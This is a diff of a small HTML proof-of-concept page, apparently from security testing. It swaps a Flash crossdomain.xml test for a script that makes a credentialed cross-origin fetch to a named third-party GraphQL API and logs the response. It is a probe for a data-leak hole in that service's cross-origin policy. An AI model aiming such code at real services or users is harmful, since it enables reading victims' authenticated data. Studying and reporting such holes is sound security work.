@@ -1,17 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crossdomain POC</title>
-</head>
+<html>
 <body>
-    <h1>Crossdomain POC</h1>
-    <p>This page hosts a Flash SWF file to test crossdomain.xml vulnerabilities.</p>
-    <object type="application/x-shockwave-flash" data="crossflash.swf" width="400" height="300">
-        <param name="movie" value="crossflash.swf" />
-        <param name="quality" value="high" />
-        <param name="allowScriptAccess" value="always" />
-    </object>
+    <script>
+        fetch('https://api.consumer.worldcoin.org/v1/graphql', {
+            method: 'GET',
+            credentials: 'include',
+            headers: {
+                'Origin': 'https://kripto-geek.github.io/crossdomain-poc/'
+            }
+        })
+        .then(response => response.text())
+        .then(data => console.log(data));
+    </script>
 </body>
 </html>
